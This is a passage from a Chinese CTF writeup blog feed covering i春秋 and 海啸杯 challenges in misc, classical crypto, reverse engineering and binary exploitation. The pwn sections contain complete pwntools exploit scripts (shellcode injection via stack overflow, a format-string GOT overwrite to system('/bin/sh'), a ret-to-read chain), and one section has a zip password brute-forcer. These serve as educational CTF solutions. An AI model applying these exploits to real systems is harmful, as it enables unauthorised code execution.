段，输入地址<code>0x6020e0</code>，检查发现这个程序的 .bss 段有可执行权限。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191201200700.png"></p><p>最终利用思路：输入 ID 时，把 shellcode 输进去。在菜单时，输入<code>Check</code>或者<code>Recharge</code>，避免<code>exit(0)</code>，然后精心构造栈上数据，将 rip 覆写为 .bss 段地址（0x6020e0）。</p><blockquote><p>Q：为什么需要输入输入<code>Check</code>或者<code>Recharge</code>?</p><p>A：覆写的是 menu_brand（0x0000000000400AEE） 返回地址，即完成一次菜单选择才会返回上层的循环(被覆写后则跳转到 .bss 段)，因此需要确保不会触发 menu_brand 的 exit() 函数，所以需要输入一个功能选项。这里为了简单就选 Check 。</p></blockquote><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=&amp;<span class="comment">#039;linux&amp;#039;,arch=&amp;#039;amd64&amp;#039;,log_level=&amp;#039;debug&amp;#039;)</span></span><br><span class="line"><span class="comment">#p = remote(&amp;#039;120.55.43.255&amp;#039;,11002)</span></span><br><span class="line">p = process(&amp;quot;./pwn&amp;quot;)</span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;ID:\n&amp;#039;)</span></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">recharge_addr = <span class="number">0x0000000000400A6F</span></span><br><span class="line">sh_addr = <span class="number">0x00000000006020E0</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(&amp;<span class="comment">#039;choice:\n&amp;#039;)</span></span><br><span class="line">p.sendline(&amp;<span class="comment">#039;Check&amp;#039; + 11 * &amp;#039;a&amp;#039; + p64(sh_addr))</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h4><p>flag{8e0ab265-066c-4d9c-8cc4-bd5a425aadae}</p><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>pwndbg 的 REGISTERS 查看不知道有没有坑？在栈溢出时，实际上已经覆写了 rip 的值，但是 REGISTERS 显示的是原值。通过查内存(0x7fffffffdd48)，可以证实 rip 已经被覆写了。又或者将 payload 的 .bss 地址修改为 ‘a’*0x8 ，就会报错，然后 gdb 程序并加载生成的 core文件，查询 rip 的值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line">Please enter your choice:</span><br><span class="line">Checkaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0000000000400b5d in ?? ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────[ REGISTERS ]─────────────────</span><br><span class="line">RDI  0x7fffffffdd38 ◂— &amp;#039;Checkaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#039;</span><br><span class="line">RSI  0x400ec7 ◂— push   0x6b6365 /* &amp;#039;Check&amp;#039; */</span><br><span class="line">RBP  0x7fffffffdd40 ◂— &amp;#039;aaaaaaaaaaaaaaaaaaaaaaaa&amp;#039;</span><br><span class="line">RIP  0x400b5d ◂— call   0x400a3a</span><br><span class="line">─────────────────[ STACK ]─────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffdd30 ◂— 0x0</span><br><span class="line">01:0008│ rdi  0x7fffffffdd38 ◂— &amp;#039;Checkaaaaaaaaaaaaaaaaaaaaaaaaaaa&amp;#039;</span><br><span class="line">02:0010│ rbp  0x7fffffffdd40 ◂— &amp;#039;aaaaaaaaaaaaaaaaaaaaaaaa&amp;#039;</span><br><span class="line">... ↓</span><br><span class="line">05:0028│      0x7fffffffdd58 ◂— 0x500000000</span><br><span class="line">06:0030│      0x7fffffffdd60 —▸ 0x400ce0 ◂— push   r15</span><br><span class="line">07:0038│      0x7fffffffdd68 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line"></span><br><span class="line">pwndbg&amp;gt; x/20gx 0x7fffffffdd38</span><br><span class="line">0x7fffffffdd38:0x6161616b636568430x6161616161616161</span><br><span class="line">0x7fffffffdd48:0x61616161616161610x6161616161616161</span><br><span class="line">0x7fffffffdd58:0x00000005000000000x0000000000400ce0</span><br><span class="line">0x7fffffffdd68:0x00007ffff7a2d8300x0000000000000001</span><br><span class="line">0x7fffffffdd78:0x00007fffffffde480x00000001f7ffcca0</span><br><span class="line">0x7fffffffdd88:0x0000000000400bc60x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="Car-Search-System"><a href="#Car-Search-System" class="headerlink" title="Car Search System"></a>Car Search System</h3><p><strong>格式化字符串漏洞</strong>，关键代码位置如图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/skyedai910/Picbed/master/img/20191204235446.png"></p><p>程序只有 NX 保护。利用思路： printf 处格式化漏洞泄露出 __libc_start_main+247 地址，得出 libc 基地址，将 put.got 覆写为 system ，修改 v7 值，利用 read 函数读入 /bin/sh ，调用 put 函数，触发 system(‘/bin/sh’) 。</p><p>修改 v7 值时，直接修改栈上的值，程序会down，所有可以通过指针 v8 来修改。—-<a href="%5Bhttps://pumpkin9.github.io/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/%5D(https://pumpkin9.github.io/2019/11/29/i%E6%98%A5%E7%A7%8B-%E7%AC%AC%E4%B8%89%E5%AD%A3CTF%E7%AD%94%E9%A2%98%E8%B5%9Bwrite-up/)">pumpkin9</a></p><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal=[&amp;<span class="comment">#039;tmux&amp;#039;,&amp;#039;split&amp;#039;,&amp;#039;-h&amp;#039;]</span></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">p = process(&amp;quot;./pwn2&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;quot;120.55.43.255&amp;quot;,11001)</span></span><br><span class="line">elf=ELF(&amp;quot;./pwn2&amp;quot;)</span><br><span class="line"><span class="comment"># 自己从本地函数库拉取</span></span><br><span class="line">lib = ELF(&amp;quot;./libc.so<span class="number">.6</span>&amp;quot;)</span><br><span class="line"><span class="comment"># 字符指针到buf偏移</span></span><br><span class="line">offset = <span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base addr </span></span><br><span class="line">p.recvuntil(&amp;quot;leave\n&amp;quot;)</span><br><span class="line">p.sendline(&amp;quot;%<span class="number">59</span>$p&amp;quot;) <span class="comment"># 偏移59在eip开头；这里读取的是eip</span></span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(p.recvline().strip(&amp;quot;\n&amp;quot;),<span class="number">16</span>)-<span class="number">247</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(__libc_start_main)</span><br><span class="line">libc = __libc_start_main - lib.symbols[&amp;<span class="comment">#039;__libc_start_main&amp;#039;]</span></span><br><span class="line">log.success(&amp;quot;libc base addr : 0x%x&amp;quot;%libc)</span><br><span class="line">system = libc+lib.symbols[&amp;<span class="comment">#039;system&amp;#039;]</span></span><br><span class="line">log.success(&amp;quot;system addr : 0x%x&amp;quot;%system)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite put.got to system</span></span><br><span class="line">p.recvuntil(&amp;quot;leave\n&amp;quot;)</span><br><span class="line">payload = fmtstr_payload(<span class="number">30</span>,&#123;elf.got[&amp;quot;puts&amp;quot;]:system&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak v7 addr</span></span><br><span class="line">p.recvuntil(&amp;quot;leave\n&amp;quot;)</span><br><span class="line">payload = &amp;quot;%<span class="number">51</span>$p&amp;quot; <span class="comment"># v7 偏移51</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">point = <span class="built_in">int</span>(p.recvline().strip(&amp;quot;\n&amp;quot;),<span class="number">16</span>)</span><br><span class="line">log.success(&amp;quot;v7 addr : 0x%x&amp;quot;%point)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite v7 to 102</span></span><br><span class="line">p.recvuntil(&amp;quot;leave\n&amp;quot;)</span><br><span class="line">payload = p32(point)+&amp;quot;%98c%<span class="number">30</span>$hhn&amp;quot; <span class="comment">#偏移30以单个字节读入ascii为98单个字符</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">p.sendlineafter(&amp;quot;ar <span class="keyword">in</span> <span class="number">7</span> day&amp;quot;,&amp;quot;/<span class="built_in">bin</span>/sh\x00&amp;quot;)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> i春秋 </tag>
            
            <tag> Writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届海啸杯部分题目Writeup</title>
      <link href="archives/a7cb8952/"/>
      <url>archives/a7cb8952/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>题目提供的<code>1.zip</code>解压出<code>flag.txt</code>，txt文件里面有大量意义不明的字符，尝试性使用<code>base64</code>解密，得到结果如下图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/20/U7kotCYViuZWn3d.png"></p><p>首行有<code>PNG</code>、<code>Adobe</code>等字样，推测是解密后的明文是PNG文件十六进制文件。用python解密后写入到后缀名为<code>png</code>的文件中，查看图片内容，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./flag.txt</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(&amp;<span class="comment">#039;1.png&amp;#039;,&amp;#039;w&amp;#039;)</span></span><br><span class="line">encodestr = base64.b64decode(&amp;<span class="comment">#039;这里填入flag.txt中的密文&amp;#039;.encode(&amp;#039;utf-8&amp;#039;))</span></span><br><span class="line">file.write(encodestr)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/20/YIAsZlXdBTnqgy7.png"></p><h3 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h3><p>用binwalk分析图片，结果显示图片中有一个压缩包。使用命令<code>binwalk -e cxk.png</code>分离出压缩包，得到flag.png，用ps的水平翻转功能，得到正常flag</p><h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/20/FmUsSLTkGZlq5EC.png"></p><h3 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h3><p>这题就是可以百度到的png隐写操作—-修改图片宽高。用winhex打开png文件，对应修改头文件中的高数值，得到flag。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/20/21IzEYGdH8qOarT.png"></p><h4 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h4><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/20/weqvR7HLGPnfjpd.png"></p><h3 id="小明的求助"><a href="#小明的求助" class="headerlink" title="小明的求助"></a>小明的求助</h3><p>题目给出压缩包里面有一个需要密码才能解压的<code>flag.txt</code>文件，且题目提示<em>密码他只知道”hlqiou”加上4位数字</em>。尝试进行爆破。</p><p>生成密码字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(&amp;quot;p.txt&amp;quot;,&amp;quot;w&amp;quot;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line">file.write(&amp;quot;hlqiou&amp;quot;+<span class="built_in">str</span>(i)+&amp;quot;\n&amp;quot;)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>爆破密码脚本（python2）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#./p.txt</span></span><br><span class="line"><span class="comment">#./xiaoming.zip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zipbp</span>(<span class="params">zfile, pwd</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zfile.extractall(pwd=pwd)</span><br><span class="line">        <span class="built_in">print</span> &amp;<span class="comment">#039;password found : %s&amp;#039; % pwd</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    zfile = zipfile.ZipFile(&amp;<span class="comment">#039;xiaoming.zip&amp;#039;)</span></span><br><span class="line">    pwdall = <span class="built_in">open</span>(&amp;<span class="comment">#039;p.txt&amp;#039;)</span></span><br><span class="line">    <span class="keyword">for</span> pwda <span class="keyword">in</span> pwdall.readlines():</span><br><span class="line">        pwd = pwda.strip(&amp;<span class="comment">#039;\n&amp;#039;)</span></span><br><span class="line">        t = threading.Thread(target=zipbp, args=(zfile, pwd))</span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line"><span class="keyword">if</span> __name__ == &amp;<span class="comment">#039;__main__&amp;#039;:</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>password found : hlqiou6974</code></p><h4 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;5oiR54ix6buE6I6J6I2D&#125;</code></p><h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="恺撒将军"><a href="#恺撒将军" class="headerlink" title="恺撒将军"></a>恺撒将军</h3><p>这题就是恺撒密码加密，特殊点就是有存在<code>]</code>、<code>&lt;</code>等标点字符，一般在线解密会略过，干脆就自己写脚本，反正就是基于ASCII码做偏移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strings = &amp;quot;f_tnluz_aghggeao&#123;t_oy_ldoia&#125;&amp;quot;</span><br><span class="line">flag = &amp;quot;&amp;quot;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-<span class="number">3</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>解密之后得到的是一个base64加密的密文：<code>ZmxhZ3tjcnlwdG9faXNfaHhiX3NvX2VBc3kwfQ==</code>，在解密一次得到flag。</p><h4 id="flag-4"><a href="#flag-4" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;crypto_is_hxb_so_eAsy0&#125;</code></p><h3 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h3><p>这题是栅栏密码，使用<a href="https://www.k2zone.cn/?p=1569">CTFcrack</a>提供的栅栏密码工具解密：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/ZiBbRDOLypn7q8U.png"></p><h4 id="flag-5"><a href="#flag-5" class="headerlink" title="flag"></a>flag</h4><p>第2栏：<code>flag&#123;yo_uget_itzha_lan_good&#125;</code></p><h3 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h3><p>这题提供较长的明文&amp;密文，尝试分析字频，得到<strong>单表替换</strong>中的对应表。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/GBdmWQTsFuHSj7K.png"></p><p>得到对应表之后，还原得到明文，获得flag</p><h4 id="flag-6"><a href="#flag-6" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;eantosi&#125;</code></p><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="baby-reverse"><a href="#baby-reverse" class="headerlink" title="baby reverse"></a>baby reverse</h3><p>这道题就是考察IDA的使用，IDA打开后，搜索（atl+t&amp;ctrl+t）flag即可。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/f1PQtdjmhpTGVyo.png"></p><h4 id="flag-7"><a href="#flag-7" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;reverse_is_easy&#125;</code></p><h3 id="easy-reverse"><a href="#easy-reverse" class="headerlink" title="easy reverse"></a>easy reverse</h3><p>IDA打开，<code>main()</code>里面存在一个条件函数，如果<code>v1=v0</code>则输出<code>you are right!!</code>，否则输出<code>you are wrong!!</code>，推测出需要满足条件才能获得flag，即使<code>v1=v0</code>。<code>v0</code>被赋值为字符串<code>kanlxvdzTljyTfyTeuor</code>；<code>v1</code>是以参数为<code>v3</code>的<code>sub_401005</code>函数的返回值，<code>v3</code>为我们输入值。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/6hCR2TPDlyjB3Ak.png"></p><p><code>sub_401005</code>函数内部运算公式：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/5oRGbv2TMP1KBdQ.png"></p><p>操作就是将每一位输入字符都与<code>0xC</code>异或后加1。那么写个脚本将<code>v0</code>每一位都减1后与<code>0xC</code>异或得到我们应该输入的值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">strings = &amp;quot;kanlxvdzTljyTfyTeuor&amp;quot;</span><br><span class="line">flag = &amp;quot;&amp;quot;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">flag += <span class="built_in">chr</span>((<span class="built_in">ord</span>(i)-<span class="number">1</span>)^<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h4 id="flag-8"><a href="#flag-8" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;crypto_is_hxb_so_eAsy0&#125;</code></p><h3 id="霸王别姬"><a href="#霸王别姬" class="headerlink" title="霸王别姬"></a>霸王别姬</h3><p>这题从描述到运行程序是的提示都是很明显地要脱壳。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/m7tpbzIE4y2nRfl.png"></p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/xCgSndGI4fleWJB.png"></p><p>通用脱壳软件脱壳一下，IDA打开<code>main</code>函数中直接就能找到flag</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/ZaFupY41s9fwzrg.png"></p><p>这个加的是压缩壳<code>UPX</code>，与<code>pwnable.kr</code>中的<code>flag</code>那题有些类似，可以在linux下用命令脱壳。</p><h4 id="flag-9"><a href="#flag-9" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;upx_so_easy_!&#125;</code></p><h3 id="电竞选手"><a href="#电竞选手" class="headerlink" title="电竞选手"></a>电竞选手</h3><p>IDA打开可以看见最后一个if条件，满足则输出<code>Correct!\nFlag is your input</code>，提示我们输入的让条件符合的值就是flag。条件成立的前提是<code>sub_401350(v4) &amp;&amp; sub_40145A()</code>两个函数的返回值相同。<code>sub_401350</code>的参数<code>v4</code>就是输入值。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/WP4Nxbapiq19yMl.png"></p><p><code>sub_401350</code>函数如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/F83p2VS4HXoYqyT.png"></p><p><em>选择case 后数值按<code>r</code>转换为字符</em></p><p>首先判断输入长度是否为32字节，然后取5~30位进入到循环结构，根据输入值的不同向<code>dword_405060</code>数组中写入不同的值，若无匹配则返回0。程序正常循环结束后会返回<code>1</code></p><p><code>sub_40145A</code>函数如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/EIQx5RliO7hMkWA.png"></p><p>主体是一个循环体：每次<code>v3</code>加上<code>数组dword_402068</code>的第<code>dword_405060[i]</code>位数；<code>v4</code>加上<code>数组dword_402078</code>的第<code>dword_405060[i]</code>位数。然后3个if条件，如果<code>v2\v3</code>大于9或者小于0；<code>byte_402000[10 * v3 + v2] == 3</code>则返回<code>0</code>。只有<code>byte_402000[10 * v3 + v2] == 43</code>才返回<code>1</code>。</p><p><code>dword_402068</code>、<code>dword_402078</code>两个数组值：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/dbfcxk64YGTSvgu.png"></p><p><code>byte_402000</code>数值值</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/4XIFmPnx9VZToBk.png"></p><p>根据<code>sub_40145A()</code>内部结构，一开始推测是用<code>wasd</code>控制每次循环读取<code>byte_402000</code>的位置，也就是避开<code>#</code>、控制最后读取是<code>+</code>，但是发现长度不对。在师兄提点下发现是用一维数组代表二维数组，从这里看出来的：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/YBaJ5erWkcRVIOn.png"></p><p><code>10*v3</code>代表的是行号，还有给出提示一行有10个元素（v3+1就读取跳了10位，相当于读取下一行同一列的元素）。<code>v2</code>代表列号。以此将<code>byte_402000</code>数值的值转换为二维数组，如图所示：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/4pPK5ovG6dDxAzE.png"></p><p>出发点就是<code>v2\v3</code>的初始值，用<code>wasd</code>控制移动，最后移动到<code>+</code>。</p><h4 id="flag-10"><a href="#flag-10" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;wwwwaaasssaassssdddssddddw&#125;</code></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>32位只开PIE保护</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/l1WrJXvzLHQfwFx.png"></p><p>直接运行：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/IEbAnXaVgzfYJ8Q.png"></p><p>IDA打开发现直接程序将输入的，当成命令执行了。那么直接输入shellcode就行了。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/T8SkDXMtlVKq4xC.png"></p><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line">p = process(&amp;quot;./shellcode&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;quot;139.199.10.70&amp;quot;,10003)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="simple-stackoverflow"><a href="#simple-stackoverflow" class="headerlink" title="simple_stackoverflow"></a>simple_stackoverflow</h3><p>32位保护全关</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/mkil1sFO69yCLdg.png"></p><p>直接运行：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/yVNpjnbGex3rXSA.png"></p><p>IDA分析，在<code>main()</code>里面的<code>overflow()</code>里面，变量<code>buf</code>距离栈底为<code>0x20</code>，而<code>read</code>可以从终端输入取最多<code>0x3FF</code>字节写入到<code>buf</code>中，这里就存在<strong>栈溢出</strong>。</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/notYXBFqyhTAZ63.png"></p><p>这里利用栈溢出控制指针，再次调用read函数向某地址写入shellcode之后，然后控制指针运行到shellcode。写入地址选择固定地址如bss段、data段（地址在IDA ctrl+s 查找），我就选择写入</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/JtCkh64BWxSv27D.png"></p><p>然后问题就是怎么给溢出后调用的read传参。read函数有三个参数，32位传参看图：</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2019/10/21/x93fAE4KZreycT2.png"></p><h4 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = &amp;<span class="comment">#039;debug&amp;#039;</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p = process(&amp;quot;./simple_stackoverflow&amp;quot;)</span><br><span class="line"><span class="comment">#p = remote(&amp;quot;139.199.10.70&amp;quot;,10004)</span></span><br><span class="line"></span><br><span class="line">payload = &amp;<span class="comment">#039;a&amp;#039; * (0x20 + 0x4) + p32(0x08048390) + p32(0x0804A040) + p32(0) + p32(0x0804A040) + p32(len(shellcode))</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>覆写eip的read函数地址应该是plt表中read地址，而不是read函数地址。即填入IDA中<code>_read</code>地址，而不是<code>read</code>地址</p>]]></content>
      
      
      <categories>
          
